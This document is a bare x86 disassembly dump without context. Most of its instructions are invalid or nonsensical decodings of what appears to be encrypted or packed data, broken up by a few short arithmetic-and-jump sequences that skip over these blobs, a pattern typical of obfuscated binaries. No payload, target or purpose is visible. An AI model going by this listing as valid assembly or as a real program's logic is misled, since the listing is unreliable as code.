  4058ed:	add    BYTE PTR [edi],dh
  4058ef:	das    
  4058f0:	pop    ecx
  4058f1:	int    0xef
  4058f3:	cmp    DWORD PTR [edx-0xafb0a6d],eax
  4058f9:	test   ebp,edx
  4058fb:	jl     0x4058c4
  4058fd:	test   al,bh
  4058ff:	test   DWORD PTR [edi+ecx*8],ebp
  405902:	fidivr DWORD PTR [ebx+0x36]
  405905:	cmp    esi,eax
  405907:	das    
  405908:	addr16 push 0xffffffe4
  40590b:	in     eax,0x45
  40590d:	fisttp DWORD PTR [esi+0x47]
  405910:	sub    DWORD PTR [ebx+0x1f1271ac],ebx
  405916:	repnz in eax,dx
  405918:	inc    ebp
  405919:	stos   DWORD PTR es:[edi],eax
  40591a:	or     eax,0xca4741bf
  40591f:	adc    al,0x3e
  405921:	leave  
  405922:	and    eax,0x2792beff
  405927:	(bad)  
  405928:	sahf   
  405929:	pop    edx
  40592a:	mov    edi,0xf911cf2d
  40592f:	out    dx,eax
  405930:	aad    0x72
  405932:	xchg   ebx,eax
  405933:	je     0x405932
  405935:	pop    ss
  405936:	push   ecx
  405937:	arpl   WORD PTR cs:[eax],di
  40593a:	out    0x73,al
  40593c:	pop    ecx
  40593d:	pop    es
  40593e:	mov    DWORD PTR [ebp-0xb8798d2],eax
  405944:	rol    DWORD PTR [esi+0x4749e8dd],cl
  40594a:	ins    BYTE PTR es:[edi],dx
  40594b:	or     bl,BYTE PTR [esi-0x514cfdb7]
  405951:	ret    
  405952:	push   ds
  405953:	mov    dh,0x8b
  405955:	aad    0x62
  405957:	icebp  
  405958:	xlat   BYTE PTR ds:[ebx]
  405959:	add    bh,dl
  40595b:	xchg   esi,eax
  40595c:	or     eax,0xb8a33b09
  405961:	leave  
  405962:	sti    
  405963:	pop    es
  405964:	push   DWORD PTR [edi]
  405966:	bswap  edi
  405968:	in     al,dx
  405969:	imul   edx,DWORD PTR [edx+edi*1+0x3bffe14c],0x5d
  405971:	dec    edi
  405972:	loop   0x40591e
  405974:	sub    bh,BYTE PTR [ebx+ecx*4+0x5ee9d055]
  40597b:	or     al,BYTE PTR [eax]
  40597d:	add    BYTE PTR [ebx+0x7d8bc855],cl
  405983:	cld    
  405984:	xor    edx,eax
  405986:	xor    edi,eax
  405988:	add    edi,ecx
  40598a:	add    edx,ecx
  40598c:	imul   edx,edi
  40598f:	mov    edi,DWORD PTR [ebp-0x8]
  405992:	mov    ebx,DWORD PTR [ebp-0x10]
  405995:	sub    ebx,edi
  405997:	cmp    ebx,edx
  405999:	ja     0x405d01
  40599f:	jmp    0x405cf9
  4059a4:	push   0x20
  4059a6:	outs   dx,BYTE PTR ds:[esi]
  4059a7:	adc    dh,BYTE PTR [eax+edx*2+0x72]
  4059ab:	pusha  
  4059ac:	cli    
  4059ad:	sar    BYTE PTR [eax+0x5f],1
  4059b0:	push   ss
  4059b1:	cdq    
  4059b2:	out    0x77,eax
  4059b4:	push   0x32
  4059b6:	jle    0x405a36
  4059b8:	xor    edi,DWORD PTR [ebp+0x7e]
  4059bb:	jle    0x405959
  4059bd:	enter  0x2d74,0x5f
  4059c1:	stos   BYTE PTR es:[edi],al
  4059c2:	aad    0xd2
  4059c4:	stos   DWORD PTR es:[edi],eax
  4059c5:	add    eax,DWORD PTR [esi+0x525cf8c8]
  4059cb:	lods   al,BYTE PTR ds:[esi]
  4059cc:	clc    
  4059cd:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059cf:	push   ecx
  4059d0:	int    0x8e
  4059d2:	push   cs
  4059d3:	loope  0x405978
  4059d5:	sbb    DWORD PTR ds:[ebx],edx
  4059d8:	inc    esi
  4059d9:	shl    DWORD PTR [ecx],cl
  4059db:	fwait
  4059dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059dd:	push   esi
  4059de:	outs   dx,DWORD PTR ds:[esi]
  4059df:	jmp    0x4059e0
  4059e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059e2:	mov    DWORD PTR [edx+0x449bc398],ecx
  4059e8:	in     eax,0x7a
  4059ea:	jp     0x4059bf
  4059ec:	jmp    0x1723c5fb
  4059f1:	ret    
  4059f2:	ja     0x405a6d
  4059f4:	in     al,dx
  4059f5:	dec    edx
  4059f6:	in     eax,0xdf
  4059f8:	ror    BYTE PTR [esi+eax*1-0x15],1
  4059fc:	dec    edx
  4059fd:	fs and al,0x66
  405a00:	retf   
  405a01:	aam    0xa9
  405a03:	in     al,0x73
  405a05:	xchg   esi,eax
  405a06:	mov    ecx,DWORD PTR [esi]
  405a08:	mov    bp,0x6d10
  405a0c:	xchg   esp,eax
  405a0d:	jno    0x4059c2
  405a0f:	aad    0x4a
  405a11:	stos   DWORD PTR es:[edi],eax
  405a12:	es xchg edx,eax
  405a14:	repz js 0x405a7e
  405a17:	in     al,0xe4
  405a19:	mov    DWORD PTR [edx],ebp
  405a1b:	inc    esi
  405a1c:	cld    
  405a1d:	jno    0x4059b6
  405a1f:	sbb    esi,edi
  405a21:	cdq    
  405a22:	and    cl,BYTE PTR [edi+edi*4-0x33]
  405a26:	daa    
  405a27:	int    0xa2
  405a29:	popa   
  405a2a:	mov    eax,ds:0xc64dd7d0
  405a2f:	mov    al,0xd7
  405a31:	mov    edi,0xa17033f6
  405a36:	je     0x405a44
  405a38:	shl    BYTE PTR [edi+0x44],0x3b
  405a3c:	cmp    ecx,ebp
  405a3e:	mov    bh,0x25
  405a40:	mov    edi,DWORD PTR [eax]
  405a42:	ins    BYTE PTR es:[edi],dx
  405a43:	jp     0x405a17
  405a45:	push   es
  405a46:	sar    cl,1
  405a48:	out    dx,al
  405a49:	sub    esp,DWORD PTR [edi]
  405a4b:	mov    al,0x4c
  405a4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a4e:	push   0xc80ba6b3
  405a53:	adc    BYTE PTR [ebp+0x67],bl
  405a56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a57:	add    bh,BYTE PTR [ebx+esi*2]
  405a5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a5c:	ins    DWORD PTR es:[edi],dx
  405a5d:	and    bl,BYTE PTR [ebp-0x35]
  405a60:	out    dx,eax
  405a61:	outs   dx,BYTE PTR ds:[esi]
  405a62:	jno    0x405a7f
  405a64:	xor    eax,0x48fef82e
  405a69:	loopne 0x405ae6
  405a6b:	aaa    
  405a6c:	cmp    BYTE PTR [esi-0x59],cl
  405a6f:	jmp    0x405ad3
  405a71:	lahf   
  405a72:	cmp    esi,DWORD PTR [ebx]
  405a74:	add    BYTE PTR ds:0xd3c26846,dh
  405a7a:	adc    DWORD PTR [ebp+0x71],esp
  405a7d:	daa    
  405a7e:	sub    esp,ebp
  405a80:	ins    DWORD PTR es:[edi],dx
  405a81:	mov    ch,dl
  405a83:	aas    
  405a84:	mov    BYTE PTR [ecx-0x44],bl
  405a87:	xor    al,0x2c
  405a89:	fld1   
  405a8b:	and    DWORD PTR [ebx],eax
  405a8d:	sbb    esi,DWORD PTR [eax]
  405a8f:	std    
  405a90:	sbb    eax,DWORD PTR [ebp+ecx*1+0xf]
  405a94:	shl    DWORD PTR [esi+0x32d824c9],cl
  405a9a:	sub    ebx,DWORD PTR [edi-0x6669c8ae]
  405aa0:	xchg   ebp,eax
  405aa1:	or     al,0x19
  405aa3:	xchg   ebp,eax
  405aa4:	rol    DWORD PTR ds:0x5a3ca5dc,1
  405aaa:	xor    ch,cl
  405aac:	mov    ah,0x2a
  405aae:	sbb    BYTE PTR [ecx+0x5],ah
  405ab1:	xlat   BYTE PTR ds:[ebx]
  405ab2:	push   cs
  405ab3:	mov    ds:0x944ffbcb,eax
  405ab8:	arpl   WORD PTR [edx],cx
  405aba:	push   0xbb9b4621
  405abf:	mov    al,0x49
  405ac1:	sub    BYTE PTR [ecx+ebx*4+0x5c],cl
  405ac5:	clc    
  405ac6:	and    al,0x6a
  405ac8:	push   eax
  405ac9:	(bad)  
  405aca:	or     al,0x76
  405acc:	aas    
  405acd:	ss shl al,0x74
  405ad1:	ror    DWORD PTR [ebx-0x78b68d63],1
  405ad7:	loop   0x405ad3
  405ad9:	pop    esp
  405ada:	mov    al,0x40
  405adc:	and    edi,edi
  405ade:	xor    al,0x9c
  405ae0:	rcr    edi,1
  405ae2:	pop    es
  405ae3:	ja     0x405b22
  405ae5:	(bad)  
  405ae6:	mov    ds:0xea80bde4,al
  405aeb:	jns    0x405b2b
  405aed:	pop    edx
  405aee:	addr16 mov al,ds:0xfe25
  405af2:	jle    0x405b09
  405af4:	cdq    
  405af5:	sub    al,bl
  405af7:	js     0x405a89
  405af9:	retf   0x460f
  405afc:	icebp  
  405afd:	jne    0x405a94
  405aff:	iret   
  405b00:	add    eax,0x7bc5c2dc
  405b05:	cld    
  405b06:	out    dx,eax
  405b07:	or     ecx,DWORD PTR [eax+0x22ff420f]
  405b0d:	outs   dx,BYTE PTR ds:[esi]
  405b0e:	mov    es,esi
  405b10:	repnz shl DWORD PTR [ebx-0x4a],0x35
  405b15:	adc    eax,0x89210498
  405b1a:	cli    
  405b1b:	lock push edx
  405b1d:	jno    0x405b6b
  405b1f:	push   ecx
  405b20:	data16 es adc ch,dh
  405b24:	pop    ebp
  405b25:	rcr    DWORD PTR [edi-0x4c],0x40
  405b29:	adc    edi,0xffffff9c
  405b2c:	inc    esp
  405b2d:	scas   eax,DWORD PTR es:[edi]
  405b2e:	mov    cl,0x4a
  405b30:	push   es
  405b31:	push   esp
  405b32:	pop    eax
  405b33:	ins    BYTE PTR es:[edi],dx
  405b34:	push   edi
  405b35:	enter  0x5736,0x31
  405b39:	in     eax,dx
  405b3a:	pop    ss
  405b3b:	imul   edx,DWORD PTR [edx],0xb82c6a13
  405b41:	mov    bl,0x28
  405b43:	jbe    0x405b0c
  405b45:	mov    esp,0xd95c7d04
  405b4a:	(bad)  
  405b4b:	fld    QWORD PTR [ebp-0x6e]
  405b4e:	sbb    DWORD PTR [ebp-0x77],edi
  405b51:	xor    esp,DWORD PTR [edx-0x7328a274]
  405b57:	pop    edx
  405b58:	hlt    
  405b59:	(bad)  
  405b5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b5b:	fs pop ebx
  405b5d:	sar    DWORD PTR [edx],1
  405b5f:	daa    
  405b60:	int3   
  405b61:	leave  
  405b62:	mov    esi,0xc7edd1ce
  405b67:	test   edx,esp
  405b69:	xchg   edx,eax
  405b6a:	aam    0x88
  405b6c:	cmp    eax,0x44d908e5
  405b71:	xor    al,0xbe
  405b73:	sub    DWORD PTR [eax+0x56],eax
  405b76:	jbe    0x405bf1
  405b78:	aaa    
  405b79:	push   es
  405b7a:	dec    esi
  405b7b:	sbb    edx,eax
  405b7d:	gs jecxz 0x405b08
  405b80:	out    dx,al
  405b81:	dec    eax
  405b82:	imul   esp,DWORD PTR [edi+0x6d],0x1f
  405b86:	mov    ch,0x52
  405b88:	adc    eax,0xae6a12e0
  405b8d:	stos   BYTE PTR es:[edi],al
  405b8e:	mov    al,ds:0x2688aec9
  405b93:	and    DWORD PTR [edi],ebx
  405b95:	fwait
  405b96:	push   ss
  405b97:	or     DWORD PTR [eax+0x9b92812],eax
  405b9d:	ins    DWORD PTR es:[edi],dx
  405b9e:	popf   
  405b9f:	push   esp
  405ba0:	loope  0x405b86
  405ba2:	xchg   edx,eax
  405ba3:	xor    DWORD PTR ds:0xa94d8ef0,ebx
  405ba9:	out    0x41,eax
  405bab:	dec    BYTE PTR [ebp-0x56]
  405bae:	jg     0x405ba0
  405bb0:	adc    eax,0x528ca546
  405bb5:	shr    eax,cl
  405bb7:	loop   0x405be1
  405bb9:	and    eax,0x228f1bc6
  405bbe:	xor    esp,ebx
  405bc0:	and    DWORD PTR [esi-0x5abfbb8d],edi
  405bc6:	arpl   WORD PTR [edi],si
  405bc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bc9:	data16 idiv BYTE PTR [ebp+0x25b8a2ba]
  405bd0:	mov    dh,0x96
  405bd2:	xchg   edx,eax
  405bd3:	es dec ebp
  405bd5:	sahf   
  405bd6:	shl    DWORD PTR [eax+0x7],0x4c
  405bda:	jmp    0x405b7b
  405bdc:	cmp    al,0x65
  405bde:	xor    al,ah
  405be0:	in     al,0x11
  405be2:	(bad)  
  405be3:	fldenv [esi+ebp*8+0x55dc1eaf]
  405bea:	sbb    BYTE PTR [esi],bl
  405bec:	push   ds
  405bed:	ret    0x145d
  405bf0:	test   al,0x8
  405bf2:	mov    BYTE PTR [esi-0x47],al
  405bf5:	scas   al,BYTE PTR es:[edi]
  405bf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bf7:	push   cs
  405bf8:	jbe    0x405bd5
  405bfa:	push   0xffffff90
  405bfc:	sbb    bl,dh
  405bfe:	fwait
  405bff:	or     edx,DWORD PTR [esp+edi*4+0x7e]
  405c03:	popa   
  405c04:	cmp    edx,DWORD PTR [eax+0x43]
  405c07:	jns    0x405c5e
  405c09:	jl     0x405bc0
  405c0b:	mov    eax,ds:0x65ae0e93
  405c10:	scas   al,BYTE PTR es:[edi]
  405c11:	xchg   DWORD PTR [edx+eax*1-0x75],ebp
  405c15:	data16 lods al,BYTE PTR ds:[esi]
  405c17:	fadd   DWORD PTR [ebx]
  405c19:	sbb    al,0x66
  405c1b:	inc    esp
  405c1c:	and    BYTE PTR [ebx+0x31],0x2f
  405c20:	fimul  WORD PTR [edx+0x25]
  405c23:	xchg   esp,eax
  405c24:	and    BYTE PTR [ebp-0x65],ah
  405c27:	and    eax,0x7297c263
  405c2c:	jp     0x405c6d
  405c2e:	hlt    
  405c2f:	mov    ds:0xf141ada8,al
  405c34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c35:	dec    edx
  405c36:	xor    DWORD PTR [ebp-0x9a36e76],esp
  405c3c:	cmc    
  405c3d:	jl     0x405c3b
  405c3f:	mov    dl,0x63
  405c41:	inc    cx
  405c43:	jnp    0x405bd6
  405c45:	clc    
  405c46:	std    
  405c47:	dec    ebx
  405c48:	mov    esi,0x7a0b410a
  405c4d:	icebp  
  405c4e:	repnz outs dx,DWORD PTR fs:[esi]
  405c51:	sub    eax,0x51486617
  405c56:	sahf   
  405c57:	or     ebx,DWORD PTR [esi]
  405c59:	call   0x560c:0xb679e26a
  405c60:	cwde   
  405c61:	lods   eax,DWORD PTR ds:[esi]
  405c62:	call   0x4091d8f8
  405c67:	and    al,0xb9
  405c69:	push   esi
  405c6a:	jl     0x405ce5
  405c6c:	adc    al,0x24
  405c6e:	sbb    BYTE PTR [edi-0x59],bh
  405c71:	jmp    0xfde21ec7
  405c76:	imul   ebx,DWORD PTR [ebx+0x16],0x986ac687
  405c7d:	or     eax,DWORD PTR [edx-0x17]
  405c80:	mov    bh,0x8a
  405c82:	xchg   edx,eax
  405c83:	imul   esi,DWORD PTR [esi+esi*1-0x27],0x10
  405c88:	test   al,0xa0
  405c8a:	xor    edi,ebp
  405c8c:	fimul  WORD PTR [ebp+eax*2+0x6aca95f8]
  405c93:	je     0x405c70
  405c95:	and    bl,bl
  405c97:	sub    ch,dl
  405c99:	mov    al,ds:0xe7b68149
  405c9e:	inc    esp
  405c9f:	aad    0x87
  405ca1:	push   ss
  405ca2:	mov    ecx,DWORD PTR [esp+ebx*4+0xc]
  405ca6:	and    edi,DWORD PTR [edi-0x2f168015]
  405cac:	rcl    DWORD PTR [eax+0x3123ad6b],0xc5
  405cb3:	stos   BYTE PTR es:[edi],al
  405cb4:	xor    al,0xae
  405cb6:	push   edx
  405cb7:	inc    edx
  405cb8:	cdq    
  405cb9:	mov    esp,0xf4b34cee
  405cbe:	pop    edx
  405cbf:	pop    edx
  405cc0:	fimul  WORD PTR [ecx+0xd]
  405cc3:	inc    DWORD PTR [ebp+0x1fbf1920]
  405cc9:	mov    ds:0xc9a46e4b,al
  405cce:	popf   
  405ccf:	dec    ecx
  405cd0:	pop    ecx
  405cd1:	mov    bh,0xaa
  405cd3:	icebp  
  405cd4:	mov    dl,BYTE PTR [eax+0x2a]
  405cd7:	clc    
  405cd8:	bound  edi,QWORD PTR [esi+0x7c]
  405cdb:	push   ss
  405cdc:	out    dx,al
  405cdd:	push   ebx
  405cde:	(bad)  
  405cdf:	mov    ds:0x65e8541,eax
  405ce4:	bound  eax,QWORD PTR [ebp+0x39255be8]
  405cea:	dec    ecx
  405ceb:	sbb    DWORD PTR cs:[edi],ebp
  405cee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cef:	sahf   
  405cf0:	mov    eax,0xad2e9330
  405cf5:	sub    ebx,DWORD PTR [ecx]
  405cf7:	xchg   DWORD PTR [esi-0x1633aa75],eax
  405cfd:	fild   DWORD PTR [esi]
  405cff:	add    BYTE PTR [eax],al
  405d01:	mov    edx,DWORD PTR [ebp-0x3c]
  405d04:	mov    edi,DWORD PTR [ebp-0x4]
  405d07:	xor    edx,eax
  405d09:	xor    edi,eax
  405d0b:	add    edx,ecx
  405d0d:	add    edi,ecx
  405d0f:	imul   edx,edi
  405d12:	mov    edi,DWORD PTR [ebp-0x8]
  405d15:	mov    ebx,DWORD PTR [ebp-0x10]
  405d18:	sub    ebx,edi
  405d1a:	jmp    0x406074
  405d1f:	jmp    0xd15f6e3f
  405d24:	xor    eax,0xe321e9f1
  405d29:	les    ecx,FWORD PTR [edi]
  405d2b:	in     eax,dx
  405d2c:	xor    BYTE PTR [esi+0x7e3e2f3a],0x7e
  405d33:	xor    edi,DWORD PTR [ebp+0x7e]
  405d36:	jle    0x405d13
  405d38:	adc    al,BYTE PTR [edi-0x62]
  405d3b:	mov    ?,WORD PTR [edi+ebp*4+0x3a]
  405d3f:	test   al,0x12
  405d41:	inc    esi
  405d42:	outs   dx,BYTE PTR ds:[esi]
  405d43:	mov    esp,esp
  405d45:	add    BYTE PTR [ecx],al
  405d47:	loop   0x405cf6
  405d49:	jae    0x405d99
  405d4b:	ss (bad) 
  405d4d:	ficomp DWORD PTR [ebx-0x6670a762]
  405d53:	ss cmp al,0xe9
  405d56:	cs sbb bh,ch
  405d59:	(bad)  
  405d5a:	ficomp DWORD PTR [eax]
  405d5c:	push   0x68c07c05
  405d61:	nop
  405d62:	mov    dh,0xc6
  405d64:	stos   DWORD PTR es:[edi],eax
  405d65:	or     al,0x7e
  405d67:	data16 and dh,BYTE PTR [eax]
  405d6a:	icebp  
  405d6b:	xor    BYTE PTR [edi],bl
  405d6d:	jl     0x405d77
  405d6f:	(bad)  
  405d70:	sub    ebx,edx
  405d72:	test   DWORD PTR es:[ecx-0xf915ec5],edx
  405d79:	sub    DWORD PTR [ebx+0x2aa19da7],ebx
  405d7f:	fisttp DWORD PTR [esi+0x5d]
  405d82:	in     al,0xfc
  405d84:	sar    DWORD PTR [eax],0x65
  405d87:	lods   al,BYTE PTR ds:[esi]
  405d88:	inc    edi
  405d89:	xor    al,0x44
  405d8b:	add    ah,BYTE PTR [edx]
  405d8d:	shl    ebx,0x94
  405d90:	and    bh,BYTE PTR [edi-0x41769089]
  405d96:	mov    eax,0xeaa0ba3d
  405d9b:	mov    bh,0x92
  405d9d:	add    al,0xb3
  405d9f:	cs push esp
  405da1:	xor    dh,BYTE PTR [esi-0x67a5118e]
  405da7:	nop
  405da8:	ss and ah,ah
  405dab:	jno    0x405d6c
  405dad:	aaa    
  405dae:	dec    ebp
  405daf:	mov    ds:0x7da914f3,eax
  405db4:	jns    0x405de8
  405db6:	dec    ebx
  405db7:	leave  
  405db8:	lea    edi,[ebp+0x22252f80]
  405dbe:	sub    dh,ch
  405dc0:	mov    ebx,0x84708a66
  405dc5:	pop    ss
  405dc6:	pop    ss
  405dc7:	shr    DWORD PTR [edx+0x3c],cl
  405dca:	out    0x3e,eax
  405dcc:	loope  0x405df2
  405dce:	fld    QWORD PTR [eax+0x16]
  405dd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405dd2:	ror    BYTE PTR [eax],0xb8
  405dd5:	lods   eax,DWORD PTR ds:[esi]
  405dd6:	adc    eax,0xac72fb44
  405ddb:	or     DWORD PTR [esi-0x18373e8e],0xdab889b1
  405de5:	cli    
  405de6:	xchg   edx,eax
  405de7:	cdq    
  405de8:	mov    eax,ds:0xa1b021d4
  405ded:	xor    DWORD PTR [ecx+eiz*1+0xe],edi
  405df1:	xchg   DWORD PTR [eax-0x1d699748],ecx
  405df7:	jns    0x405e6d
  405df9:	addr16 mov eax,ds:0x8383
  405dfd:	inc    edx
  405dfe:	sahf   
  405dff:	stos   BYTE PTR es:[edi],al
  405e00:	push   esp
  405e01:	ror    ebp,0x32
  405e04:	in     al,dx
  405e05:	jecxz  0x405dc6
  405e07:	retf   
  405e08:	imul   edx,DWORD PTR [esi-0x12],0x3cc2ab7d
  405e0f:	jbe    0x405da5
  405e11:	es scas al,BYTE PTR es:[edi]
  405e13:	add    DWORD PTR [edi],esi
  405e15:	mov    esp,0x31596c18
  405e1a:	add    BYTE PTR [ebx],dl
  405e1c:	arpl   WORD PTR [ebx+0x221d9712],ax
  405e22:	gs push ds
  405e24:	xor    eax,0xedaa52d8
  405e29:	inc    ecx
  405e2a:	into   
  405e2b:	xchg   esi,eax
  405e2c:	js     0x405ea8
  405e2e:	cs xchg ebp,eax
  405e30:	push   eax
  405e31:	enter  0xd01a,0x8e
  405e35:	mov    bl,dl
  405e37:	stos   BYTE PTR es:[edi],al
  405e38:	nop
  405e39:	push   edx
  405e3a:	mov    al,BYTE PTR [edx]
  405e3c:	loope  0x405e59
  405e3e:	dec    esi
  405e3f:	scas   al,BYTE PTR es:[edi]
  405e40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e41:	xchg   esp,eax
  405e42:	shl    DWORD PTR [edi+0x1b],cl
  405e45:	lock es neg ch
  405e49:	adc    ebp,DWORD PTR [esi+0x161532dc]
  405e4f:	lods   eax,DWORD PTR ds:[esi]
  405e50:	sub    DWORD PTR [edi+0x3b],ebx
  405e53:	test   DWORD PTR [ebx-0x54],edx
  405e56:	or     DWORD PTR [eax],0x90530474
  405e5c:	dec    ecx
  405e5d:	pushf  
  405e5e:	mov    ebp,0xb9b7a67e
  405e63:	xchg   ecx,eax
  405e64:	xchg   esp,eax
  405e65:	shl    BYTE PTR [ebp+0x79],0x71
  405e69:	jae    0x405ead
  405e6b:	in     eax,0x20
  405e6d:	scas   al,BYTE PTR es:[edi]
  405e6e:	xchg   ecx,eax
  405e6f:	add    BYTE PTR [esi+0x31bc952e],al
  405e75:	push   ebp
  405e76:	aad    0x5d
  405e78:	out    dx,eax
  405e79:	pop    esi
  405e7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e7b:	or     al,0xe1
  405e7d:	sub    edx,ecx
  405e7f:	int    0x22
  405e81:	push   ds
  405e82:	sub    BYTE PTR [edi-0x2f],bh
  405e85:	adc    al,0xa2
  405e87:	call   0x52bbeff3
  405e8c:	test   al,0x88
  405e8e:	sub    ch,dl
  405e90:	jmp    0x405e66
  405e92:	loopne 0x405edf
  405e94:	xchg   edi,eax
  405e95:	fld    TBYTE PTR [ebx]
  405e97:	and    eax,0x154cc491
  405e9c:	jnp    0x405e5e
  405e9e:	push   ss
  405e9f:	movd   mm3,edi
  405ea2:	push   ecx
  405ea3:	(bad)  
  405ea5:	xchg   ecx,eax
  405ea6:	sbb    al,0x92
  405ea8:	mov    edi,0x4f756227
  405ead:	xchg   ecx,eax
  405eae:	fld    st(4)
  405eb0:	dec    edx
  405eb1:	mov    al,ds:0xe94c2789
  405eb6:	mov    esi,0xf542b3d9
  405ebb:	fs inc edi
  405ebd:	lea    ebx,[ebp+0x74]
  405ec0:	push   0x5c
  405ec2:	stos   BYTE PTR es:[edi],al
  405ec3:	dec    eax
  405ec4:	xchg   ebx,eax
  405ec5:	or     DWORD PTR [eax-0x56],eax
  405ec8:	retf   
  405ec9:	mov    esi,0xecc0eb9c
  405ece:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ecf:	mov    eax,ds:0xfb54f430
  405ed4:	dec    ebp
  405ed5:	bound  ebp,QWORD PTR [ecx+0x38]
  405ed8:	mov    esp,0x7e0e22c
  405edd:	out    dx,eax
  405ede:	push   esi
  405edf:	popa   
  405ee0:	inc    esi
  405ee1:	xchg   ecx,eax
  405ee2:	mov    bh,0xf
  405ee4:	jge    0x405e6b
  405ee6:	in     eax,dx
  405ee7:	lds    ebx,FWORD PTR [ecx]
  405ee9:	and    BYTE PTR [esi-0x22],0x8b
  405eed:	add    eax,0x8e1d8e53
  405ef2:	loopne 0x405f55
  405ef4:	mov    al,ds:0x1a0cb558
  405ef9:	in     eax,dx
  405efa:	ret    
  405efb:	xchg   ebp,eax
  405efc:	mov    al,0x1
  405efe:	xchg   esp,eax
  405eff:	jne    0x405f25
  405f01:	xchg   esi,eax
  405f02:	outs   dx,BYTE PTR ds:[esi]
  405f03:	pusha  
  405f04:	mov    esp,0x397f605
  405f09:	lods   al,BYTE PTR ds:[esi]
  405f0a:	std    
  405f0b:	test   eax,0x397bf9df
  405f10:	lahf   
  405f11:	push   eax
  405f12:	push   esi
  405f13:	into   
  405f14:	mov    esi,0x6ff49198
  405f19:	loope  0x405f47
  405f1b:	jnp    0x405ebd
  405f1d:	outs   dx,BYTE PTR ds:[esi]
  405f1e:	leave  
  405f1f:	pusha  
  405f20:	aad    0x33
  405f22:	mov    eax,0x5f430907
  405f27:	idiv   dl
  405f29:	aam    0x1a
  405f2b:	push   esp
  405f2c:	xor    DWORD PTR [edi+0x230d0f28],ebp
  405f32:	(bad)  [ebx-0x76]
  405f35:	imul   ebp,ebx,0xaa251c00
  405f3b:	je     0x405f33
  405f3d:	(bad)  
  405f3e:	jge    0x405f96
  405f40:	les    esp,FWORD PTR [edi]
  405f42:	pop    ecx
  405f43:	ja     0x405efc
  405f45:	(bad)  
  405f46:	lods   eax,DWORD PTR ds:[esi]
  405f47:	dec    eax
  405f48:	adc    eax,0x812ec84
  405f4d:	mov    cl,0x17
  405f4f:	mov    ch,0x75
  405f51:	mov    ecx,0x639c7234
  405f56:	sub    DWORD PTR [eax-0x54],ebp
  405f59:	xchg   edx,eax
  405f5a:	cwde   
  405f5b:	add    DWORD PTR [ecx+0x73],ebx
  405f5e:	je     0x405f6c
  405f60:	rcl    BYTE PTR [eax+eiz*8+0x73],1
  405f64:	pop    edx
  405f65:	sti    
  405f66:	mov    ch,0xb8
  405f68:	push   ds
  405f69:	mov    ss,WORD PTR [ebx+eiz*1]
  405f6c:	pusha  
  405f6d:	loopne 0x405f31
  405f6f:	retf   
  405f70:	jb     0x405f52
  405f72:	sbb    al,0x2e
  405f74:	add    ebx,DWORD PTR [edi-0x76]
  405f77:	call   0xd421:0x42589959
  405f7e:	cwde   
  405f7f:	sub    BYTE PTR [ecx+0x3a458acb],dh
  405f85:	imul   ebp,DWORD PTR [esi+0x7275c91a],0x6a
  405f8c:	sbb    ah,BYTE PTR [ebp+0x25]
  405f8f:	dec    ebx
  405f90:	test   DWORD PTR ss:[ebp-0x76bce2e],0x4d34efa8
  405f9b:	sbb    bl,BYTE PTR [esi-0x3dcca33]
  405fa1:	and    edx,DWORD PTR [ecx-0x6e901a98]
  405fa7:	(bad)  
  405fa8:	jp     0x8ec4b21c
  405fae:	jp     0x405fc4
  405fb0:	adc    ebp,DWORD PTR [ebp-0x70a90e1c]
  405fb6:	jo     0x405fc0
  405fb8:	(bad)  
  405fb9:	loopne 0x405f77
  405fbb:	jo     0x405fec
  405fbd:	pop    ebx
  405fbe:	int3   
  405fbf:	xor    eax,DWORD PTR es:[ebx-0x4ee5bc90]
  405fc6:	push   es
  405fc7:	sub    al,0x6f
  405fc9:	arpl   WORD PTR [ecx-0x42],di
  405fcc:	cs (bad) 
  405fce:	adc    BYTE PTR [ebp-0x6a],bl
  405fd1:	mov    ebp,0x86c6dcbc
  405fd6:	lds    ecx,FWORD PTR [edx+eiz*2+0x21]
  405fda:	in     al,0x5e
  405fdc:	inc    esp
  405fdd:	aam    0x2b
  405fdf:	xchg   esi,eax
  405fe0:	fild   WORD PTR [ecx+0x42]
  405fe3:	scas   eax,DWORD PTR es:[edi]
  405fe4:	mov    al,ds:0x13f349bd
  405fe9:	ror    DWORD PTR [esi],1
  405feb:	dec    esp
  405fec:	adc    bl,dh
  405fee:	inc    ebp
  405fef:	push   es
  405ff0:	imul   ecx,edi,0xffffffd2
  405ff3:	mov    ds:0x5dbd408a,al
  405ff8:	outs   dx,BYTE PTR ds:[esi]
  405ff9:	add    BYTE PTR fs:[esi+0x46960d62],ah
  406000:	pushf  
  406001:	iret   
  406002:	xchg   ecx,eax
  406003:	sti    
  406004:	test   BYTE PTR [ebx],bl
  406006:	or     BYTE PTR [edx+0xff08b16],cl
  40600c:	test   al,bh
  40600e:	imul   bx,WORD PTR [edx-0x68cd0e33],0x6dec
  406017:	bound  ecx,QWORD PTR [edi-0x64]
  40601a:	aas    
  40601b:	scas   al,BYTE PTR es:[edi]
  40601c:	fs stos DWORD PTR es:[edi],eax
  40601e:	mov    BYTE PTR ds:[edi],0x36
  406022:	mov    edx,0xf2c1a81a
  406027:	sbb    eax,0xd3ae903a
  40602c:	jno    0x406095
  40602e:	dec    ebp
  40602f:	adc    dl,BYTE PTR [esi+0x6ab8f125]
  406035:	push   ds
  406036:	dec    eax
  406037:	fcmove st,st(4)
  406039:	ret    0xe68c
  40603c:	gs inc esi
  40603e:	or     eax,0xb5efa783
  406043:	jb     0x406005
  406045:	mov    edx,DWORD PTR [edi]
  406047:	stos   DWORD PTR es:[edi],eax
  406048:	sar    DWORD PTR [edx],cl
  40604a:	mov    dh,0x81
